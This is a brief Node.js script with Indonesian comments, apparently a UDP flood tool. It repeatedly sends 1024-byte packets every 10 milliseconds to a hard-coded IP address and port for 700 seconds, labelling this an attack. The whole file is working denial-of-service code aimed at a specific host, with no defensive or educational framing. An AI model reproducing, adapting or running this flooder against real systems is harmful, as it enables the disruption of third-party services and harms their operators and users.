const dgram = require('dgram');

const targetIP = '15.235.180.223';
const targetPort = 2249;
const attackDuration = 700; // Durasi serangan dalam detik

const attack = setInterval(() => {
    const socket = dgram.createSocket('udp4');
    const buffer = Buffer.allocUnsafe(1024);
    socket.send(buffer, 0, buffer.length, targetPort, targetIP, (err) => {
        if (err) {
            console.error('Error:', err);
        }
        socket.close();
    });
}, 10); // Intensitas serangan (milidetik)

setTimeout(() => {
    clearInterval(attack);
    console.log('Serangan selesai.');
}, attackDuration * 1000);